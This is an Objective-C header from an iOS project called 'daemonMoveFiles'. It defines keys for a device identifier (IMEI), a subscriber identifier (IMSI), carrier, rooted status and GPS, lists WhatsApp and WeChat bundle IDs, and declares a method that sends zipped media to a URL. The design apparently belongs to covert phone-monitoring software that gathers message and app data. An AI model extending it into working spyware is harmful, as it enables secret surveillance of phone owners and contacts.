//
//  TFile.h
//  daemonMoveFiles
//
//  Created by Admin on 10/13/16.
//  Copyright © 2016 vohulg. All rights reserved.
//

#import <Foundation/Foundation.h>

// Byte MARKER[] = {0xBA, 0xAD, 0xF0, 0x0D}; //4 byte

#define TCOMMOM_HEADER_GUID_LENGTH 72
#define TCOMMOM_HEADER_DATA_TYPE_LENGTH 50
#define TCOMMOM_HEADER_UUID_LENGTH 100
#define TCOMMOM_HEADER_ORIGIN_FILENAME_LENGTH 512
#define TCOMMOM_HEADER_HEADERFILE_LENGTH 1024
#define TCOMMOM_HEADER_DEVICETYPE_LENGTH 50
#define TCOMMON_GUID_LENGTH 36
#define TCOMMON_HEADER_DEVICETYPE "IOS"

#define TCOMMON_CRYPTKEY_LENGTH 20
#define TCOMMON_HEADER_JSON_LENGTH_BYTE_COUNT 2


static NSString* jsonKey[] = {
    @"guid",                //0
    @"system",              //1
    @"uuid",                //2
    @"file_name",           //3
    @"data_type",           //4
    @"data_version",        //5
    @"mf_source",           //6
    @"imei",                //7
    @"rooted",              //8
    @"operator",            //9
    @"imsi",                //10
    @"locale",               //11
    @"sub_data_type"         //12
    };

typedef enum {
    TFILE_GUID_JSON_KEY,            //0
    TFILE_SYSTEM_JSON_KEY,          //1
    TFILE_UUID_JSON_KEY,            //2
    TFILE_REALNAME_JSON_KEY,        //3
    TFILE_DATATYPE_JSON_KEY,        //4
    TFILE_DATA_VERSION_JSON_KEY,    //5
    TFILE_MF_SOURCE_JSON_KEY,       //6
    TFILE_IMEI_JSON_KEY,            //7
    TFILE_ROOTED_JSON_KEY,          //8
    TFILE_OPERATOR_JSON_KEY,        //9
    TFILE_IMSI_JSON_KEY,            //10
    TFILE_LOCALE_JSON_KEY,           //11
    TFILE_SUBDATA_TYPE_JSON_KEY      //12
    

    
    
    
} TFILE_JSON_KEY;

static NSString* TFILE_SUBDATA_TYPE_LOGS = @"logs";
static NSString* TFILE_SUBDATA_TYPE_MEDIA_FILE = @"media_file";
static NSString* TFILE_SUBDATA_TYPE_MESSAGES = @"messages";
static NSString* TFILE_SUBDATA_TYPE_VOIP = @"voip";
static NSString* TFILE_SUBDATA_TYPE_APP_DB_FOR_RESTORE = @"app_db_for_restore";
static NSString* TFILE_SUBDATA_TYPE_APP_DB = @"app_db";
static NSString* TFILE_DATA_TYPE_GET_FILE = @"get_file";
static NSString* TFILE_DATA_TYPE_LOGS = @"logs";
static NSString* TFILE_DATA_TYPE_GPS = @"gps";

static NSString* TFILE_SUBDATA_TYPE_APP_BACKUP = @"media_backup";

static NSString* TFILE_CONSTANT_SYSTEM = @"ios";
static NSString* TFILE_CONSTANT_LOCALE = @"en";
static NSString* TFILE_CONSTANT_VERSION = @"2.17";
static NSString* TFILE_CONSTANT_BUNDLE_NAME_WHATSAPP = @"net.whatsapp.whatsapp";
static NSString* TFILE_CONSTANT_BUNDLE_NAME_WECHAT = @"com.tencent.xin";
static NSString* TFILE_CONSTANT_BUNDLE_NAME_VIBER = @"";


@interface TFile : NSObject

//-(NSMutableData*) getHeader:(NSString*)origFileName andDataType:(NSString*)dataType;

//-(BOOL) encryptAndMoveFile:(NSString*)filePathIn withHeader:(NSDictionary*)headerWithDataTypeDic andPlistFile:(NSString*)plistFile;

-(BOOL) sendMediaZip:(NSString*)zipFullPath to:(NSString*) url withGuid:(NSString*) guid withUUID:(NSString*)uuid;

@end
